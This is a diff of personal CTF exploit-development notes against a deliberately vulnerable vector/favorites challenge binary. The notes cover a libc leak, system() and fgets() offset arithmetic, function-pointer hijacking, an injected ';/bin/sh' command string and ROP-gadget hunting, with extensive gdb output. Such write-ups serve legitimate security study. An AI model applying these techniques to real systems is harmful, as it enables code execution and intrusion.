@@ -13,7 +13,7 @@ This makes us have to pick the values in such a way that their sum equals the va
 Once we get the sum we want, we can add it to favs multiple times (good for us, simpler interaction).
 
 
-Also, we can't call the printFunc() pointer fromt he favs themselves. Instead, after achieving a value we want in the printFunct pointer, we have to load it back to one of the two (v1 or v2) vectors and then call printing.
+Also, we can't call the printFunc() pointer from the favs themselves. Instead, after achieving a value we want in the printFunct pointer, we have to load it back to one of the two (v1 or v2) vectors and then call printing.
 
 
 
@@ -427,4 +427,480 @@ Yeah got it ;)
 A note about reliability and elegant solutions:
 This is obviously not an elegant solution, as the exploit would not be reliable in case our target address fit the positive range of the signed int (it won't here, though). We could easily detect this and in such case avoid adding the additional overflow offset to the second vector's "d" field before continuing.
 Ah fuck, we can't. We can only leak the printVector() address after creating the first vector. That's OK, we can overwrite it by entering the vector data once again and then summing once again. And afterwards add the faves and print.
+
+OK, now let's do this without using thisIsASecret(). We're gonna use system() instead, which is ASLR-ed and therefore leaking and calculations will be necessary.
+
+Since the target app requires us to provide the number in decimal format, our target integer being signed forces us to  conversion before tampering and sending it back. I decided to take advantage of pwnlib's features:
+
+    printf_addr = u32(leak[0x0:0x4])
+    print("Leaked printf() address: ",hex(printf_addr))
+    printf_addr_signed = u32(leak[0x0:0x4],sign="signed") # this gives us the signed variant of this variable
+    print("Leaked printf() address as a signed integer (dec): ",str(printf_addr_signed))
+
+Result:
+
+('Leaked printf() address: ', '0xb7e70280')
+('Leaked printf() address as a signed integer (dec): ', '-1209597312')
+
+OK, awesome. So now we can simply add the system()-printf() offset to this value before sending it to the target apps input as the 'd' integer.
+
+We know printf() is larger than system() by 0xd0f0.
+
+Let's do some upside-down calculations (sample printf() and system() values taken below):
+
+Breakpoint 1, 0x80000abf in printMenu ()
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+gdb-peda$ p printf
+$2 = {<text variable, no debug info>} 0xb7e70280 <__printf>
+
+#inlude <stdio.h>
+int main(void)
+{
+	signed int systema = 0xb7e63190;
+	signed int printfa = 0xb7e70280;
+	printf("%d\n",systema);
+	printf("%d\n",printfa);
+}
+
+-1209650800
+-1209597312
+
+So, in the unsigned world, printf is -1209597312.
+Now, to make it system, we subtract the known 0xd0f0 offset between the two:
+>>> -1209597312-53488
+-1209650800
+
+Right. And since our program is addition (sum) of the two, why not provide both these negative values on v1.d and v2.d inputs, without further convolution?
+
+This should work, as:
+#include <stdio.h>
+int main(void)
+{
+	signed int systema = -1209650800;
+	printf("%x\n",systema);
+	return 0;
+}
+b7e63190
+
+So:
+#include <stdio.h>
+int main(void)
+{
+	signed int printfa = -1209597312;
+	signed int offset = -53488;
+	unsigned int systema = printfa + offset;
+	printf("%x\n",systema);
+	return 0;
+}
+b7e63190
+
+So yeah. We just leak the printf() as a signed integer, then put it back into one vector's "d", while putting negative offset ("-53488") to the second v2.d. The sum() function will do the rest.
+
+The second integer will become the system()'s argument. Let's make it "A" by giving it 0x1 (1) and 0x40 (64) on v1.e and v2.e inputs, respectively. The rest will be nullbytes, hence if we create a script named "A" and add /tmp to PATH, we have our arbitrary script execution.
+
+OK, so system() version is working, but we still have to fix the argument.
+
+This is faves right before we call system():
+gdb-peda$ x/100wx faves
+0x80004008:     0xb7e70280      0x40420041      0x00004043      0xb7e63190
+0x80004018:     0x40404080      0x40404046      0x40404047      0x40404048
+0x80004028:     0x40404040      0x40404049      0x40404040      0x00000031
+0x80004038:     0x40420041      0x00004043      0xb7e63190      0x40404080
+0x80004048:     0x40404046      0x40404047      0x40404048      0x40404040
+0x80004058:     0x40404049      0x40404040      0x00000000      0x00000031
+0x80004068:     0x00004043      0xb7e63190      0x40404080      0x40404046
+0x80004078:     0x40404047      0x40404048      0x40404040      0x40404049
+0x80004088:     0x40404040      0x00000000      0x00000000      0x00000031
+0x80004098:     0xb7e63190      0x40404080      0x40404046      0x40404047
+0x800040a8:     0x40404048      0x40404040      0x40404049      0x40404040
+0x800040b8:     0x00000000      0x00000000      0x00000000      0x00020f41
+0x800040c8:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800040d8:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800040e8:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800040f8:     0x00000000      0x00000000      0x00000000      0x00000000
+
+So, the argument system() receives is 0x80004098, which means it is trying to use this:
+0x80004098:     0xb7e63190      0x40404080      0x40404046      0x40404047
+0x800040a8:     0x40404048      0x40404040      0x40404049      0x40404040
+
+as a string. I guess the easiest solution to this will be to replace 0x40404080 (v1.e+v2.e) with something like ';A;;'.
+This way the first 'command' \x90\x31\xe6\xb7 will be ignored (we could name our script this way too, I guess we could, but as we don't know in advance all the characters of this address due to ASLR, we might hit a bad character not allowed in a filename). It's better to let it fail and move on to the next command, which we create by inserting an 'A'  (the name of our script) isolated between command separators ';'.
+So, we want 0x80 to become ';' (59 => 0x3b). Then the 0x40 become 0x41, then another 0x40 become ';' (59 => 0x3b).
+
+So, the integer we want at v3.h:
+0x3b3b413b
+We need to avoid zeros, so let's split it into:
+0x3b3b413a
++
+0x1
+
+Decimal version:
+printf "%d" 0x3b3b413b
+993739067
+
+OK, so we split it into 
+993739066 and 1.
+
+Fuck, something was still wrong, so I looked it up:
+Breakpoint 1, __libc_system (line=0x80003040 <v1> "\220\061\346\267\001") at ../sysdeps/posix/system.c:178
+178     ../sysdeps/posix/system.c: No such file or directory.
+gdb-peda$ x/100wx $esp
+0xbffff67c:     0x8000154c      0x80003040      0xbffff744      0xbffff744
+0xbffff68c:     0x00000001      0xb7fcd3c4      0x3300000d      0x80003040
+0xbffff69c:     0x45e20700      0x800015d0      0xb7fcd000      0x00000000
+0xbffff6ac:     0xb7e3ca83      0x00000001      0xbffff744      0xbffff74c
+0xbffff6bc:     0xb7feccea      0x00000001      0xbffff744      0xbffff74c
+0xbffff6cc:     0x00000003      0xbffff740      0xb7fcd000      0x00000000
+0xbffff6dc:     0x00000000      0x00000000      0x6a6407dd      0x521de3cd
+0xbffff6ec:     0x00000000      0x00000000      0x00000000      0xb7fde000
+0xbffff6fc:     0x0000055c      0xb7fde2dc      0x00000001      0xb7e3c999
+0xbffff70c:     0x80002fa8      0x00000001      0x80000950      0x00000000
+0xbffff71c:     0x80000981      0x80001484      0x00000001      0xbffff744
+0xbffff72c:     0x800015d0      0x80001640      0xb7fed180      0xbffff73c
+0xbffff73c:     0x0000001c      0x00000001      0xbffff86a      0x00000000
+0xbffff74c:     0xbffff875      0xbffff895      0xbffff8b6      0xbffff8c4
+0xbffff75c:     0xbffff8cf      0xbffff932      0xbffff943      0xbffff9a6
+0xbffff76c:     0xbffff9b7      0xbffff9cc      0xbffff9dc      0xbffff9e4
+0xbffff77c:     0xbffffa03      0xbffffa14      0xbffffa26      0xbffffa38
+0xbffff78c:     0xbffffa6a      0xbffffa8c      0xbffffa9f      0xbffffab2
+0xbffff79c:     0xbffffabb      0xbffffad0      0x00000000      0x00000020
+0xbffff7ac:     0xb7fdbd3c      0x00000021      0xb7fdb000      0x00000010
+0xbffff7bc:     0x078bfbff      0x00000006      0x00001000      0x00000011
+0xbffff7cc:     0x00000064      0x00000003      0x80000034      0x00000004
+0xbffff7dc:     0x00000020      0x00000005      0x00000009      0x00000007
+0xbffff7ec:     0xb7fde000      0x00000008      0x00000000      0x00000009
+0xbffff7fc:     0x80000950      0x0000000b      0x00000406      0x0000000c
+gdb-peda$ x/1s 0x8000154c
+0x8000154c <main+200>:  "\353\061\350\354\374\377\377\353*\350\257\375\377\377\353#\350,\376\377\377\353\034\350\332\376\377\377\353\025\215\203\250\354\377\377\211\004$\350x\363\377\377\270\001"
+gdb-peda$ x/1s 0x80003040
+0x80003040 <v1>:        "\220\061\346\267\001"
+gdb-peda$ x/1wx 0x80003040
+0x80003040 <v1>:        0xb7e63190
+gdb-peda$ x/2wx 0x80003040
+0x80003040 <v1>:        0xb7e63190      0x00020001
+gdb-peda$
+
+This is weird. Why does v1 have 01 and 02 loaded here, after being memcpied from faves[3]?
+
+I have no idea. The system()'s pointer is copied from faves[i]...
+
+Oh fuck I know why. 
+
+	memcpy(v, faves[i], sizeof(v)); does not copy the structure, only the pointer.
+This means we have to name our file the same way as the pointer to printf() is named, while using 0x3b as the v1.a character.
+
+Well, OK.
+
+So yeah, I did it properly (generated the filename on the fly). The problem as I expected; characters from the system()
+'s address fall within a forbidden range.
+
+So, it seems we have to resort to ROP-based stack-pivoting here.
+
+Interesting (must have hit some filename that almost worked :P)
+    '1\n'
+[DEBUG] Received 0x7a bytes:
+    00000000  73 68 3a 20  72 65 6c 6f  63 61 74 69  6f 6e 20 65  │sh: │relo│cati│on e│
+    00000010  72 72 6f 72  3a 20 73 68  3a 20 73 79  6d 62 6f 6c  │rror│: sh│: sy│mbol│
+    00000020  20 5f 5f 6c  6f 6e 67 6a  cc 70 5f 63  68 6b 2c 20  │ __l│ongj│·p_c│hk, │
+    00000030  76 65 72 73  69 6f 6e 20  47 4c 49 42  43 5f 32 2e  │vers│ion │GLIB│C_2.│
+    00000040  31 31 20 6e  6f 74 20 64  65 66 69 6e  65 64 20 69  │11 n│ot d│efin│ed i│
+    00000050  6e 20 66 69  6c 65 20 6c  69 62 63 2e  73 6f 2e 36  │n fi│le l│ibc.│so.6│
+    00000060  20 77 69 74  68 20 6c 69  6e 6b 20 74  69 6d 65 20  │ wit│h li│nk t│ime │
+    00000070  72 65 66 65  72 65 6e 63  65 0a                     │refe│renc│e·│
+    0000007a
+
+
+OK, this is our stack when our codexec happens:
+
+gdb-peda$ x/100wx $esp
+0xbffff67c:     0x8000154c      0x80003040      0xbffff744      0xbffff744
+0xbffff68c:     0x00000001      0xb7fcd3c4      0x3300000d      0x80003040
+0xbffff69c:     0x70eac700      0x800015d0      0xb7fcd000      0x00000000
+0xbffff6ac:     0xb7e3ca83      0x00000001      0xbffff744      0xbffff74c
+0xbffff6bc:     0xb7feccea      0x00000001      0xbffff744      0xbffff74c
+0xbffff6cc:     0x00000003      0xbffff740      0xb7fcd000      0x00000000
+0xbffff6dc:     0x00000000      0x00000000      0x56cbfec5      0x6eb21ad5
+0xbffff6ec:     0x00000000      0x00000000      0x00000000      0xb7fde000
+0xbffff6fc:     0x0000055c      0xb7fde2dc      0x00000001      0xb7e3c999
+0xbffff70c:     0x80002fa8      0x00000001      0x80000950      0x00000000
+0xbffff71c:     0x80000981      0x80001484      0x00000001      0xbffff744
+0xbffff72c:     0x800015d0      0x80001640      0xb7fed180      0xbffff73c
+0xbffff73c:     0x0000001c      0x00000001      0xbffff86f      0x00000000
+
+This time we do not seem to have any control over the stack - unless we want to try to stuck our payload somewhere in the input buffer (like argc). The problem is that we won't have a gadget that would take us there.
+So I gues we want to pivot the stack to become 0x80003040 (will and just do the ROP magic from there).
+
+gdb-peda$ x/100wx 0x80003040
+0x80003040 <v1>:        0xb7e63190      0x00020001      0x00000003      0xffff2f10
+0x80003050 <v1+16>:     0x00000001      0x00000006      0x00000007      0x00000008
+0x80003060 <v1+32>:     0x00000000      0x00000009      0x00000000      0x00000000
+0x80003070:     0x00000000      0x00000000      0x00000000      0x00000000
+0x80003080 <v3>:        0xb7e70280      0x4042003b      0x00004043      0xb7e63190
+0x80003090 <v3+16>:     0x3b3b413b      0x40404046      0x40404047      0x40404048
+0x800030a0 <v3+32>:     0x00000000      0x40404049      0x40404040      0x00000000
+0x800030b0:     0x00000000      0x00000000      0x00000000      0x00000000
+0x800030c0 <faves>:     0x80004008      0x80004038      0x80004068      0x80004098
+0x800030d0 <faves+16>:  0x00000000      0x00000000      0x00000000      0x00000000
+0x800030e0 <faves+32>:  0x00000000      0x00000000      0x00000000      0x00000000
+0x800030f0:     0x00000000      0x00000000      0x00000000      0x00000000
+0x80003100 <v2>:        0x800010e9      0x4040003a      0x00004040      0xb7e70280
+0x80003110 <v2+16>:     0x3b3b413a      0x40404040      0x40404040      0x40404040
+0x80003120 <v2+32>:     0x00000000      0x40404040      0x40404040      0x00000000
+
+Well, a pivot to 0x80003048 or higher would be great.
+
+We need a gadget like: mov edx esp; pop; pop; ret
+
+[----------------------------------registers-----------------------------------]
+EAX: 0xb7e63190 (<__libc_system>:       push   ebx)
+EBX: 0x80002fa8 --> 0x2eb0
+ECX: 0xb7fce8a4 --> 0x0
+EDX: 0x80003040 --> 0xb7e63190 (<__libc_system>:        push   ebx)
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff6a8 --> 0x0
+ESP: 0xbffff67c --> 0x8000154c (<main+200>:     jmp    0x8000157f <main+251>)
+EIP: 0xb7e63190 (<__libc_system>:       push   ebx)
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------cod
+
+Fuck. VERY few gadgets...
+ROPeMe> search pop ?
+Searching for ROP gadget:  pop ? with constraints: []
+0x9c9L: pop ebp ;;
+0xa12L: pop ebp ;;
+0xa73L: pop ebp ;;
+0x87dL: pop ebx ;;
+0x1676L: pop ebx ;;
+
+0x9c9L: pop ebp ;;
+This one would be nice, but add esp won't help (I guess)?
+gdb-peda$ x/4i 0x800009c5
+   0x800009c5 <deregister_tm_clones+37>:        add    esp,0x14
+   0x800009c8 <deregister_tm_clones+40>:        pop    ebx
+   0x800009c9 <deregister_tm_clones+41>:        pop    ebp
+   0x800009ca <deregister_tm_clones+42>:        ret
+gdb-peda$ x/1wx $esp+0x14
+0xbffff690:     0xb7fcd3c4
+gdb-peda$ x 0xb7fcd3c4
+Nah, can't control it.
+
+Same at 0xa12L: pop ebp ;;
+gdb-peda$ x/4i 0x80000a0e
+   0x80000a0e <register_tm_clones+46>:  add    esp,0x14
+   0x80000a11 <register_tm_clones+49>:  pop    ebx
+   0x80000a12 <register_tm_clones+50>:  pop    ebp	<-- a12
+   0x80000a13 <register_tm_clones+51>:  ret
+
+And 0xa73L: pop ebp ;;   
+gdb-peda$ x/4i 0x80000a6f
+   0x80000a6f <__do_global_dtors_aux+63>:       add    esp,0x14
+   0x80000a72 <__do_global_dtors_aux+66>:       pop    ebx
+   0x80000a73 <__do_global_dtors_aux+67>:       pop    ebp
+   0x80000a74 <__do_global_dtors_aux+68>:       ret
+  
+0x87dL:
+   0x8000087a <_init+30>:       add    esp,0x8
+   0x8000087d <_init+33>:       pop    ebx
+   0x8000087e <_init+34>:       ret
+
+gdb-peda$ x/1wx $esp+0x8
+0xbffff684:     0xbffff744
+
+gdb-peda$ x/4i 0x80001670
+   0x80001670 <_fini+12>:       sbb    DWORD PTR [eax],eax
+   0x80001672 <_fini+14>:       add    BYTE PTR [ebx-0x3ca4f73c],al
+   0x80001678 <_fp_hw>: add    eax,DWORD PTR [eax]
+   0x8000167a <_fp_hw+2>:       add    BYTE PTR [eax],al
+gdb-peda$ x/4i 0x8000166f
+   0x8000166f <_fini+11>:       cmp    ebx,DWORD PTR [ecx]
+   0x80001671 <_fini+13>:       add    BYTE PTR [eax],al
+   0x80001673 <_fini+15>:       add    esp,0x8
+   0x80001676 <_fini+18>:       pop    ebx
+gdb-peda$ x/4i 0x8000166e
+   0x8000166e <_fini+10>:       ret
+   0x8000166f <_fini+11>:       cmp    ebx,DWORD PTR [ecx]
+   0x80001671 <_fini+13>:       add    BYTE PTR [eax],al
+   0x80001673 <_fini+15>:       add    esp,0x8
+gdb-peda$ x/4i 0x8000166d
+   0x8000166d <_fini+9>:        add    ebx,0x193b
+   0x80001673 <_fini+15>:       add    esp,0x8
+   0x80001676 <_fini+18>:       pop    ebx
+   0x80001677 <_fini+19>:       ret
+   
+Kurwa.
+
+OK, what about gadgets in libc?
+  
+gdb-peda$ ropgadget
+ret = 0x80000866
+popret = 0x8000087d
+pop2ret = 0x800009c8
+pop3ret = 0x800010a3
+pop4ret = 0x800010a2
+leaveret = 0x800015c6
+addesp_12 = 0x8000087a
+addesp_20 = 0x80000ab1
+addesp_28 = 0x800009c5
+addesp_44 = 0x80000b91
+addesp_60 = 0x8000109f
+
+Interesting. Maybe we can control this?
+gdb-peda$ x/1wx $esp+0x60
+0xbffff6dc:     0x00000000
+
+And this?
+gdb-peda$ x/1wx $esp+0x44
+0xbffff6c0:     0x00000001
+
+This does not look like it:
+gdb-peda$ x/1wx $esp+0x28
+0xbffff6a4:     0xb7fcd000
+
+gdb-peda$ x/1wx $esp+0x20
+0xbffff69c:     0x70eac700 and this?
+
+gdb-peda$ x/20wx $esp+0x12
+0xbffff68e:     0xd3c40000     
+
+
+Also, what about leaveeret? It means mov ebp esp; ret (if we can control what's at ebp, then we could control esp?)
+EBP is 0x0
+gdb-peda$ x/1wx $ebp
+0xbffff6a8:     0x00000000
+
+Where does it come from?
+gdb-peda$ x/20wx $ebp
+0xbffff6a8:     0x00000000      0xb7e3ca83      0x00000001      0xbffff744
+0xbffff6b8:     0xbffff74c      0xb7feccea      0x00000001      0xbffff744
+0xbffff6c8:     0xbffff74c      0x00000003      0xbffff740      0xb7fcd000
+0xbffff6d8:     0x00000000      0x00000000      0x00000000      0x56cbfec5
+0xbffff6e8:     0x6eb21ad5      0x00000000      0x00000000      0x00000000
+gdb-peda$ x/20wx $esp
+0xbffff67c:     0x8000154c      0x80003040      0xbffff744      0xbffff744
+0xbffff68c:     0x00000001      0xb7fcd3c4      0x3300000d      0x80003040
+0xbffff69c:     0x70eac700      0x800015d0      0xb7fcd000      0x00000000 <-- this
+0xbffff6ac:     0xb7e3ca83      0x00000001      0xbffff744      0xbffff74c
+0xbffff6bc:     0xb7feccea      0x00000001      0xbffff744      0xbffff74c
+
+Kurwa. 
+
+What if we groom the stack by first calling printVector() for an actual vector?
+
+ 	printf("unsigned long g: %lu\n", v->g);
+	printf("long long h: %lld\n", v->h);
+	printf("unsigned long long i: %llu\n", v->i);
+}
+
+I am afraid this only passes the pointer, not the actual value.
+
+This is interesting and has to be checked :D
+
+If we manage to set ESP to an 8-byte variable, it means system + string (fuck, this still means 3 bytes needed).
+
+Fuck, no luck. The only thing we actually need is to make our vector pointer a string that can be used as a command.
+
+Actually, after running printFavorites I do see something interesting on the stack (which we could reach, maybe, if we run some of those add gadgets):
+
+gdb-peda$ x/100wx $esp-0x50
+0xbffff690:     0xb7fcdac0      0x80001b5c      0xbffff6b4      0x38ebd700
+0xbffff6a0:     0xb7fcdc20      0x80002fa8      0x80002fa8      0x80001376 <-- this is interesting
+0xbffff6b0:     0x80001b5c      0x0000000a      0xb7fcdc20      0xb7e8a54c 
+0xbffff6c0:     0xb7fcdc20      0x00c10000      0x0000000a      0x38ebd700 <-- this is even more interesting
+0xbffff6d0:     0x80002fa8      0x80002fa8      0xbffff708      0x8000155a
+0xbffff6e0:     0x00000001      0xbffff7a4      0xbffff7a4      0x00000001
+0xbffff6f0:     0xb7fcd3c4      0x3500000d      0x800015db      0x38ebd700
+0xbffff700:     0x800015d0      0xb7fcd000      0x00000000      0xb7e3ca83
+0xbffff710:     0x00000001      0xbffff7a4      0xbffff7ac      0xb7feccea
+
+Now, back in printVector:
+Breakpoint 2, 0x800010e9 in printVector ()
+gdb-peda$ x/100wx $esp
+0xbffff6dc:     0x8000154c      0x80003040      0xbffff7a4      0xbffff7a4
+0xbffff6ec:     0x00000001      0xb7fcd3c4      0x3300000d      0x80003040
+0xbffff6fc:     0x38ebd700      0x800015d0      0xb7fcd000      0x00000000
+0xbffff70c:     0xb7e3ca83      0x00000001      0xbffff7a4      0xbffff7ac
+0xbffff71c:     0xb7feccea      0x00000001      0xbffff7a4      0xbffff7ac
+0xbffff72c:     0x00000003      0xbffff7a0      0xb7fcd000      0x00000000
+0xbffff73c:     0x00000000      0x00000000      0x07a68e8a      0x3fdc2a9a
+0xbffff74c:     0x00000000      0x00000000      0x00000000      0xb7fde000
+
+Fuck, no, those are stdin/stdout pointers.
+
+gdb-peda$ x 0xb7fcdc20
+0xb7fcdc20 <_IO_2_1_stdin_>:    0xfbad2288
+gdb-peda$ x 0xb7fcdac0
+0xb7fcdac0 <_IO_2_1_stdout_>:   0xfbad2a84
+
+OK, maybe libc to save the day? Over 16k gadgets :D
+
+ROPeMe> search pop esp
+Searching for ROP gadget:  pop esp with constraints: []
+0x3930L: pop esp ;;
+0x6a5ebL: pop esp ;;
+0x126586L: pop esp ;;
+
+gdb-peda$ x/i 0xb7e23000+0x3930
+   0xb7e26930:  pop    esp
+gdb-peda$ x/i 0xb7e23000+0x6a5eb
+   0xb7e8d5eb <__GI___wunderflow+11>:   pop    esp
+gdb-peda$ x/i 0xb7e23000+0x126586
+   0xb7f49586 <_Unwind_GetRegionStart+6>:       pop    esp
+   
+gdb-peda$ x/5i 0xb7e23000+0x392c
+   0xb7e2692c:  xchg   ebp,eax
+   0xb7e2692d:  and    DWORD PTR [ecx],edi
+   0xb7e2692f:  push   cs
+   0xb7e26930:  pop    esp
+   0xb7e26931:  ret
+   
+OK, 30 does not have two pops.
+
+Neither does 0x6a5eb. Fuck.
+
+gdb-peda$ x/10i 0xb7e23000+0x6a5e4
+   0xb7e8d5e4 <__GI___wunderflow+4>:    in     al,dx
+   0xb7e8d5e5 <__GI___wunderflow+5>:    adc    BYTE PTR [ebx-0x17dfdb8c],cl
+   0xb7e8d5eb <__GI___wunderflow+11>:   pop    esp
+   0xb7e8d5ec <__GI___wunderflow+12>:   ret
+   0xb7e8d5ed <__GI___wunderflow+13>:   or     eax,DWORD PTR [eax]
+
+gdb-peda$ x/10i 0xb7e23000+0x12657f
+   0xb7f4957f:  add    BYTE PTR [ebx-0x74fbdbbc],cl
+   0xb7f49585 <_Unwind_GetRegionStart+5>:       inc    eax
+   0xb7f49586 <_Unwind_GetRegionStart+6>:       pop    esp
+   0xb7f49587 <_Unwind_GetRegionStart+7>:       ret
+   
+   
+   FUCK FUCK FUCK that ROP would be soo beautiful.
+   
+And Corb3nik did not solve this the hard way (btw for some reason he used the secret in three lines, I do not know why exactly) - and yeah, he used index 4 ;]]
+
+OK, I have it! Instead of using system, we'll call fgets - and fill the goddamn buffer with our arbitrary command.
+Then we'll overwrite fgets with system, by loading another fave!
+
+Breakpoint 1, 0x80000abf in printMenu ()
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xb7e63190 <__libc_system>
+gdb-peda$ p printf
+$2 = {<text variable, no debug info>} 0xb7e70280 <__printf>
+gdb-peda$ p fgets
+$3 = {<text variable, no debug info>} 0xb7e86b20 <_IO_fgets>
+
+We already have system() calculated.
+When it comes to fgets(), we need to add 0x168a0 to leaked printf() address to its address():
+gdb-peda$ p 0xb7e86b20-0xb7e70280
+$4 = 0x168a0
+
+Manipulating the sum requires manipulating v1 and v2. Hence, we need to do things in the following order:
+
+1. Initiate v1 the same way as so far, with 1-s.
+2. Attain system() at faves[4].printFunc (yup, i = 4), the same way we did so far with index 3 (to avoid the negative signed integer bullshit).
+3. Manipulate v2 in such a way that after calling v1+v2, v3.printFunc becomes system().
+4. Add v3 to faves two times (index 5, index 6 - we want six to avoid the signing BS again).
+5. Load fave[4] to v2 (this will overwrite its pointer with fgets()).
+7. 'Print' v2, overwriting it with fgets() - use ";/bin/sh" as payload
+8. Load fave[6] to v2 (this will overwrite its pointer with system())
+9. 'Print' v2 and get shell - without using the thisIsSecret() function - bonus version :)
 
